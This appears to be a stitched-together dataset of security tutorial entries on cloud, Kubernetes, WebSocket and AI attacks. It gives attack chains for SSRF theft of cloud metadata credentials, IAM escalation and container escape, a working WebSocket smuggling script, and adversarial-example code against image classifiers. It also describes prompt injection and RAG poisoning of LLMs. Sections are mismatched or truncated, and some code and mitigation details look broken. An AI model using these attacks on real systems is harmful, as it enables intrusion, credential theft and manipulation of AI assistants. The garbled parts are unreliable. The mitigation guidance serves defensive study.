tutorial.overview: Cloud SSRF to steal metadata credentials is one of the most impactful attack surfaces of recent years. The 2019 Capital One breach (affecting more than 100 million users) was carried out exactly this way, using SSRF to reach the AWS IMDS and obtain IAM credentials. The instance metadata service (169.254.169.254) provides temporary credentials, user data, network configuration, and other sensitive information. Once a web application has an SSRF vulnerability, the attacker can pivot straight from the web layer into the cloud infrastructure layer.
tutorial.vulnerability: Root cause: (1) AWS IMDSv1 requires no authentication to access (only reachability from inside the instance network); (2) The web application has an SSRF vulnerability that allows requests to internal addresses; (3) The EC2 instance is attached to an over-privileged IAM role (violating least privilege); (4) Secrets/passwords are hard-coded in the user data; (5) Even with IMDSv2 enabled (which requires a PUT to get a token), some SSRF scenarios (such as header injection) can still bypass it; (6) The GCP and Azure header protections can be bypassed in certain SSRF types.
tutorial.exploitation: Attack chain: (1) Find an SSRF vulnerability (URL parameters, webhooks, file import, and other entry points); (2) Request http://169.254.169.254/latest/meta-data/ to confirm the cloud environment; (3) Get the IAM role name: /iam/security-credentials/; (4) Get the temporary credentials (AccessKeyId + SecretAccessKey + Token); (5) Configure the credentials in the AWS CLI and enumerate permissions; (6) Depending on the permissions, export S3 data, extract secrets, escalate IAM privileges, or take over EC2 instances.
tutorial.mitigation: Defenses: (1) Enforce IMDSv2 (aws ec2 modify-instance-metadata-options --http-tokens required); (2) Fix the SSRF vulnerability: URL whitelist / forbid internal addresses; (3) Apply least privilege to IAM roles; (4) Use VPC endpoints to restrict IMDS access; (5) Enable GuardDuty to detect anomalous API calls; (6) Do not store sensitive information in user-data; (7) Use the IMDSv2 hop limit=1 to prevent container pivoting.

tutorial.overview: S3 bucket misconfiguration is one of the most common vulnerabilities in cloud security. Statistics show that roughly 5-10% of S3 buckets have some form of public-access misconfiguration. Many major historical data breaches (such as the NSA contractor, Twitch source code, and Facebook user data) all involved improper S3 configuration. After discovering a target bucket via bucket name enumeration, DNS analysis, and front-end code review, an attacker may obtain sensitive assets such as database backups, API keys, and user PII.
tutorial.vulnerability: Root causes: (1) S3 buckets had public access by default (AWS has blocked this by default since 2023, but old buckets were not migrated); (2) the bucket policy uses Principal:"*" (allows anonymous) or "AWS":"*" (allows any AWS user); (3) the ACL grants READ/WRITE to the AllUsers or AuthenticatedUsers group; (4) developers set a backup/log bucket public for convenience but forgot to disable it; (5) the bucket name is predictable (such as company-backup, company-prod-data); (6) a pre-signed URL leaked in code or logs.

tutorial.mitigation: Defenses: (1) enable S3 Block Public Access (account level + bucket level); (2) audit the ACL and Policy of existing buckets and remove Principal:"*"; (3) use AWS Config rules to continuously monitor S3 configuration changes; (4) use random prefixes for S3 bucket names to prevent enumeration; (5) enable S3 Access Logging and CloudTrail to audit access logs; (6) enable SSE-KMS encryption and VPC endpoints for sensitive buckets to restrict access sources.

tutorial.overview: AWS IAM privilege escalation is a core skill in cloud penetration testing. Research shows that many AWS environments have privilege-escalation paths caused by IAM policy misconfiguration. Rhino Security Labs has compiled 20+ known IAM privilege-escalation methods, covering scenarios such as PassRole, policy version overwrite, and role hijacking. After obtaining low-privilege credentials (for example via SSRF/code leak), an attacker can use these paths to escalate to administrator privileges.
tutorial.vulnerability: Root causes: (1) IAM policies use wildcards (such as iam:*) granting excessive permissions; (2) iam:PassRole does not restrict the scope of roles that can be passed; (3) IAM policy version management lets a low-privilege user create a new version to overwrite the original restrictions; (4) the AssumeRole trust policy is configured too permissively; (5) multiple low-risk permissions combined can form an escalation chain (such as create Lambda + PassRole = administrator); (6) lack of continuous IAM permission auditing and least-privilege practice.
tutorial.exploitation: Escalation flow: (1) use enumerate-iam or PACU to enumerate all effective permissions of the current user; (2) check against the list of known escalation paths for exploitable permission combinations; (3) most common paths: PassRole+CreateFunction(Lambda)/CreateEC2/CreateGlueJob; (4) policy-based paths: CreatePolicyVersion/PutUserPolicy/AttachUserPolicy; (5) credential-based paths: CreateAccessKey/CreateLoginProfile/UpdateLoginProfile; (6) after performing the escalation operation, confirm the permission change with get-caller-identity.
tutorial.mitigation: Defenses: (1) implement the IAM least-privilege principle -- use IAM Access Analyzer to identify and remove excess permissions; (2) restrict the Resource of iam:PassRole to specific role ARNs rather than *; (3) use SCP (Service Control Policies) to block high-risk operations at the organization level; (4) enable the IAM Credential Report for periodic auditing; (5) use AWS Config rules to continuously detect high-risk IAM configurations; (6) enforce MFA and session policy restrictions.

tutorial.overview: Kubernetes container escape is one of the most severe security threats in cloud-native environments. After an attacker obtains a shell inside a Pod via a web vulnerability (such as RCE/SSRF), if the Pod has misconfigurations (privileged container, hostPath mount, high-privilege ServiceAccount), the attacker can escape to the host and further take over the entire K8s cluster. tutorial.vulnerability: Root causes: (1) the Pod runs with privileged:true (has all Linux capabilities); (2) host paths (hostPath) are mounted such as /, /var/run/docker.sock, /proc, etc.; (3) the ServiceAccount is bound to cluster-admin or excessive permissions; (4) PodSecurityPolicy/PodSecurityStandard restrictions are not enabled; (5) the K8s API Server does not have RBAC enabled or has an overly broad ClusterRoleBinding configured; (6) the container runs as the root user.
tutorial.exploitation: Attack path: (1) after obtaining a Pod shell via web RCE, first confirm the container environment (cgroup/dockerenv); (2) check whether it is a privileged container (try mount/fdisk/capsh) -- if so, directly mount the host disk to escape; (3) check the ServiceAccount permissions -- if it has create pods, create a privileged Pod to escape; (4) if it has list secrets, obtain all keys in the cluster; (5) if the SA permissions are insufficient, check whether docker.sock is mounted (which can create a privileged container); (6) use host access to further control the entire K8s cluster.
tutorial.mitigation: Defenses: (1) enable PodSecurityStandard (restricted level) to prohibit privileged containers; (2) prohibit hostPath mounts and use PV/PVC to manage storage; (3) least-privilege ServiceAccount -- disable automountServiceAccountToken unless needed; (4) use NetworkPolicy to restrict Pod network access; (5) deploy runtime security tools such as Falco to detect anomalous behavior; (6) use seccomp/AppArmor/SELinux to restrict container system calls; (7) do not run containers as root (runAsNonRoot:true).

tutorial.overview: Cross-Site WebSocket Hijacking (CSWSH) is a security issue specific to the WebSocket protocol. WebSocket uses an HTTP upgrade request during the handshake, and the browser automatically attaches the Cookie. If the server does not validate the Origin header, an attacker can establish a cross-site connection from a malicious web page to the target WebSocket server and hijack the victim's session. This is equivalent to a WebSocket version of CSRF, but because WebSocket is bidirectional communication, the attacker can also receive returned data in real time.
tutorial.vulnerability: Root causes: (1) the WebSocket handshake is an ordinary HTTP request, and the browser automatically attaches the Cookie (same as CSRF); (2) the server does not validate whether the request's Origin header is a trusted source; (3) once the WebSocket connection is established it is not subject to the same-origin policy; (4) CSRF tokens are usually not applied to the WebSocket handshake; (5) WebSocket messages usually do not pass through WAF detection; (6) some frameworks accept WebSocket connections from any Origin by default.
tutorial.exploitation: Attack flow: (1) search for the WebSocket connection URL in the front-end code (wss://target/ws); (2) use the websocat tool to test whether a cross-site Origin is accepted; (3) if an arbitrary Origin is accepted, construct a malicious HTML page and use new WebSocket() to connect to the target (the browser automatically attaches the Cookie); (4) in the ws.onmessage callback, steal all returned data and exfiltrate it to the attacker's server; (5) further test for injection vulnerabilities in WebSocket messages (SQL/XSS/command injection).
tutorial.mitigation: Defenses: (1) strictly validate the Origin header during the WebSocket handshake (whitelist mode); (2) use an independent WebSocket authentication token (not dependent on the Cookie); (3) implement CSRF token validation at the WebSocket message level; (4) perform input validation and output encoding on WebSocket message content; (5) use WSS (WebSocket Secure) for encrypted transport; (6) implement WebSocket message rate limiting to prevent abuse.

execution.command:
# Use Python to construct WebSocket smuggling
import socket, ssl, base64

def ws_smuggle(target_host, target_port, internal_path):
    # WebSocket handshake
    key = base64.b64encode(b"test1234test1234").decode()
    upgrade = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"\r\n"
    )
    
    ctx = ssl.create_default_context()
    sock = ctx.wrap_socket(socket.socket(), server_hostname=target_host)
    sock.connect((target_host, target_port))
    sock.send(upgrade.encode())
    
    resp = sock.recv(4096).decode()
    print(f"Upgrade response: {resp[:100]}")
    
    if "101" in resp:
        # Smuggle an HTTP request to the internal network
        smuggled = (
            f"GET {internal_path} HTTP/1.1\r\n"
            f"Host: 127.0.0.1\r\n"
            f"\r\n"
        )
        sock.send(smuggled.encode())
        print(sock.recv(4096).decode())

ws_smuggle("{TARGET}", 443, "/admin/")

tutorial.overview: WebSocket smuggling is an advanced attack technique that exploits differences in how reverse proxies handle WebSocket upgrades. When a proxy (such as Nginx/HAProxy/Varnish) receives a WebSocket upgrade request, it establishes a TCP tunnel, after which the proxy no longer inspects the data transmitted through the tunnel. The attacker can send arbitrary HTTP requests inside the WebSocket tunnel, bypassing the front-end proxy's access control and communicating directly with the back end to access internal APIs and management interfaces that should be restricted.
tutorial.vulnerability: Root causes: (1) after handling 101 Switching Protocols, the reverse proxy treats the connection as a raw TCP tunnel and no longer performs HTTP-layer inspection; (2) the proxy's validation of the WebSocket Upgrade request is not strict enough (it may not verify whether the back end actually completed the 101 response); (3) H2C (HTTP/2 Cleartext) upgrade smuggling -- some proxies also create an unmonitored tunnel when handling h2c upgrades; (4) the proxy and back end parse the same request inconsistently (path, Host header, etc.); (5) the back end assumes all requests have passed through the front-end proxy's security filtering.
tutorial.exploitation: Attack path: (1) detect whether the target is behind a reverse proxy (Server/Via headers, response characteristics); (2) send a WebSocket Upgrade request and observe the proxy behavior (whether it returns 101); (3) if the proxy allows the upgrade but the back end is not a real WebSocket service, exploit the tunnel to send HTTP requests; (4) in the established tunnel, send HTTP requests pointing to 127.0.0.1/internal-network IPs; (5) scan internal-network ports and services; (6) access internal management interfaces and restricted APIs; (7) for H2C smuggling, use the h2cSmuggler tool to automate testing.
tutorial.mitigation: Defenses: (1) the reverse proxy should establish a tunnel only when the back end confirms the 101 response; (2) prohibit Upgrade requests to non-WebSocket back ends; (3) configure a WebSocket endpoint whitelist at the proxy layer (only allow specific paths to upgrade); (4) disable H2C (http2_push_preload off in Nginx); (5) back-end services must also implement access control and not assume all requests pass through the proxy; (6) use Network Policy/Security Groups to restrict the internal-network range the back end can access.

tutorial.overview: WebSocket authentication and authorization bypass is a common but easily overlooked security issue in real-time communication applications. Unlike HTTP requests, once a WebSocket is established it is a persistent connection, and many applications only validate identity during the handshake and no longer check for permission changes afterward. This leads to: (1) the WebSocket connection remains active after the user logs out; (2) communication is still possible after the token expires; (3) channel subscription lacks an authorization check. Chat applications, real-time collaboration tools, and financial market data feeds are especially high-risk.
tutorial.vulnerability: Root causes: (1) WebSocket performs authentication only once during the handshake and does not validate permission changes afterward; (2) after a user logs out / changes their password, the established WebSocket connection is not actively disconnected; (3) the subscription operation for channels/rooms (Channel/Room) lacks a server-side authorization check; (4) WebSocket messages lack a signature or tamper-protection mechanism; (5) rate limiting is usually only applied at the HTTP layer, and WebSocket messages are not restricted; (6) the HTTP polling downgrade mode of frameworks such as Socket.io may bypass the security controls at the WebSocket layer.
tutorial.exploitation: Attack flow: (1) use browser developer tools to analyze the WebSocket authentication flow (Cookie or Token); (2) test whether the WebSocket connection is still valid after the token expires / after logout; (3) attempt to subscribe to other users' private channels (IDOR); (4) attempt to subscribe to the admin channel (vertical privilege escalation); (5) test injection points in WebSocket messages (SQL/XSS); (6) check whether a rate limit exists -- no limit may lead to DoS or bulk data scraping.
tutorial.mitigation: Defenses: (1) implement continuous authentication at the WebSocket message level (periodically validate token validity); (2) actively close all WebSocket connections when a user logs out / permissions change; (3) implement server-side authorization checks for channel subscription (verify channel ownership); (4) set a WebSocket message rate limit and size limit; (5) use short-lived JWTs (15 minutes) and implement token refresh at the WebSocket layer; (6) audit input validation for all WebSocket event handlers.

tutorial.overview: LLM prompt injection (Prompt Injection) ranks first in the OWASP LLM Top 10. As AI assistants such as ChatGPT and Claude are integrated into various applications, prompt injection has become a brand-new attack surface. By overriding the AI's system instructions with carefully crafted input, an attacker can cause: (1) leakage of the system prompt and business logic; (2) bypass of content safety guardrails; (3) unauthorized operations executed via the AI's tool-calling capability; (4) indirect injection -- planting hidden instructions in documents/web pages processed by the AI.

tutorial.mitigation: Defenses: (1) use a separate system message channel rather than plain-text concatenation; (2) post-process and filter the LLM output (especially tool-call requests); (3) implement least privilege -- restrict the tools the AI can call and the data scope it can access; (4) bidirectional content safety detection on both input and output; (5) use frameworks such as Guardrails/NeMo to implement structured safety protection; (6) preprocess external content processed by the AI to clean hidden text.

tutorial.overview: AI model stealing and inference attacks are a core research area of machine learning security. As enterprises deploy expensively trained AI models as API services, an attacker can build a functionally equivalent substitute model through a large number of queries (Model Extraction), or determine whether specific data is in the training set via membership inference (Membership Inference). execution.command:
# Fast Gradient Sign Method (FGSM)
import torch
import torchvision.models as models
from torchvision import transforms
from PIL import Image

model = models.resnet50(pretrained=True).eval()

def fgsm_attack(image, epsilon, data_grad):
    sign_grad = data_grad.sign()
    perturbed = image + epsilon * sign_grad
    return torch.clamp(perturbed, 0, 1)

# Load and preprocess the image
img = Image.open("cat.jpg")
transform = transforms.Compose([transforms.Resize(256), 
    transforms.CenterCrop(224), transforms.ToTensor()])
img_tensor = transform(img).unsqueeze(0)
img_tensor.requires_grad = True

# Forward pass
output = model(img_tensor)
target = output.argmax()  # original classification
loss = torch.nn.functional.cross_entropy(output, torch.tensor([target]))
model.zero_grad()
loss.backward()

# Generate the adversarial example
adv_img = fgsm_attack(img_tensor, epsilon=0.03, data_grad=img_tensor.grad.data)
adv_output = model(adv_img)
print(f"Original: {target.item()}, Adversarial: {adv_output.argmax().item()}")

# Black-box adversarial attack (does not require the model's internal information)
import requests
import numpy as np
from PIL import Image

def query_model(image_bytes):
    r = requests.post("https://{TARGET}/api/classify",
                       files={"image": image_bytes})
    return r.json()["predictions"]  # {class: probability}

def boundary_attack(original_img, target_class, max_queries=5000):
    """Decision-based boundary attack"""
    # Start from an image of the target class
    adv = np.random.uniform(0, 255, original_img.shape).astype(np.uint8)
    
    for step in range(max_queries):
        # Gradually approach the original image (keep the classification as the target class)
        alpha = max(0.01, 1.0 - step/max_queries)
        candidate = (1-alpha) * original_img + alpha * adv
        candidate = candidate.astype(np.uint8)
        
        pred = query_model(to_bytes(candidate))
        if pred["class"] == target_class:
            adv = candidate
            if step % 100 == 0:
                dist = np.linalg.norm(adv.astype(float) - original_img.astype(float))
                print(f"Step {step}: distance={dist:.2f}")
    
    return adv

# Generate an adversarial patch (Adversarial Patch)
import torch
import torchvision.models as models

def generate_adversarial_patch(model, target_class, patch_size=50, epochs=500):
    """Generate a printable adversarial patch"""
    patch = torch.rand(1, 3, patch_size, patch_size, requires_grad=True)
    optimizer = torch.optim.Adam([patch], lr=0.01)
    
    for epoch in range(epochs):
        # Apply the patch at a random position
        x, y = random.randint(0,174), random.randint(0,174)
        img = torch.rand(1, 3, 224, 224)  # random background
        img[:, :, x:x+patch_size, y:y+patch_size] = patch
        
        output = model(img)
        loss = -torch.nn.functional.cross_entropy(
            output, torch.tensor([target_class]))
        
        optimizer.zero_grad()
        loss.backward()
        optimizer.step()
        patch.data.clamp_(0, 1)
    
    return patch.detach()

# Generate a patch that makes the model recognize any object as a "toaster"

def diverse_input(img, prob=0.5):

tutorial.overview: Adversarial Examples are the most classic attack technique in AI security, proposed by Goodfellow et al. in 2014. By adding tiny perturbations imperceptible to the human eye to the input data, a deep learning model can be made to produce completely wrong predictions. This attack has been proven effective against many types of models such as image classification, object detection, speech recognition, and text analysis, and adversarial examples have cross-model transferability, posing a serious threat to safety-critical systems such as autonomous driving, security surveillance, and content moderation.
tutorial.vulnerability: Root causes: (1) the decision boundary of a deep neural network is highly irregular in high-dimensional space, and a tiny perturbation can cross the decision boundary; (2) the model relies too much on statistical correlations rather than truly understanding semantics -- feature patterns meaningless to humans may have high influence on the model; (3) the transferability of adversarial examples -- an adversarial example generated for one model can usually also fool other models; (4) adversarial examples in the physical world (such as adversarial patches, specially made stickers) can actually affect deployed AI systems.
tutorial.exploitation: Attack methods: (1) white-box attack (model known): FGSM (fast but weak) -> PGD (iterative FGSM) -> C&W (strongest L2); (2) black-box attack (query only): transferability-based (generate with a substitute model), query-based (boundary attack/HopSkipJump); (3) text domain: Unicode homoglyph substitution, synonym substitution, character-level perturbation to bypass NLP models; (4) physical domain: adversarial patches (Adversarial Patch), adversarial T-shirts, adversarial glasses can fool vision systems in the physical world.
tutorial.mitigation: Defenses: (1) adversarial training (Adversarial Training) -- mix adversarial examples into the training data to improve robustness; (2) input preprocessing: JPEG compression, random padding, image smoothing to reduce the effect of adversarial perturbations; (3) adversarial example detector: train a dedicated binary classifier to distinguish normal and adversarial inputs; (4) certified robustness (Certified Robustness): provide mathematically proven robustness guarantees; (5) ensemble multiple models to vote (Ensemble Defense); (6) deployment monitoring: detect statistical anomalies in the input data.

tutorial.overview: RAG (Retrieval-Augmented Generation) poisoning is one of the most practically threatening attacks against modern AI applications. Many enterprises use the RAG architecture to let the LLM answer questions based on an internal knowledge base -- documents are converted to vectors stored in a vector database (Chroma/Pinecone/Qdrant), and at query time the most relevant documents are retrieved and injected into the LLM context. If an attacker can inject documents into the knowledge base (via an upload interface / shared document / email, etc.), the embedded malicious instructions will be automatically retrieved by the RAG system at query time and injected into the AI context.
tutorial.vulnerability: Root causes: (1) the RAG system injects the retrieved document content into the LLM context without filtering; (2) knowledge base document upload lacks content review for prompt injection; (3) the vector database (Chroma/Qdrant/Weaviate) is exposed on the network without authentication by default; (4) hidden text in documents (white font/metadata/zero-width characters) can bypass manual review but is processed by the AI; (5) semantic retrieval is based on vector similarity -- an attacker can use keyword stuffing to make a malicious document match more queries; (6) in a multi-tenant RAG system, one user's document may affect other users' query results.
tutorial.exploitation: Attack path: (1) identify whether the target uses RAG (by asking the AI which sources it referenced); (2) find the document upload interface or vector database API; (3) construct a poisoning document -- embed hidden prompt injection instructions within normal content; (4) upload the poisoning document to the knowledge base; (5) construct a trigger query so that RAG retrieves the poisoning document; (6) verify whether the AI's answer is affected by the injected instruction; (7) if the vector database exposes an API, directly read and tamper with all knowledge base content.
tutorial.mitigation: Defenses: (1) perform prompt injection detection on uploaded documents (using a dedicated classifier); (2) enable authentication and network isolation for the vector database (do not expose it to the public internet); (3) clean the RAG retrieval results before injecting them into the LLM (remove suspicious instructions); (4) implement document source tagging and permission isolation (multi-tenant scenarios); (5) monitor AI output anomalies (such as suddenly mentioning an external email/URL); (6) use chunk-level content security filtering rather than only document-level.
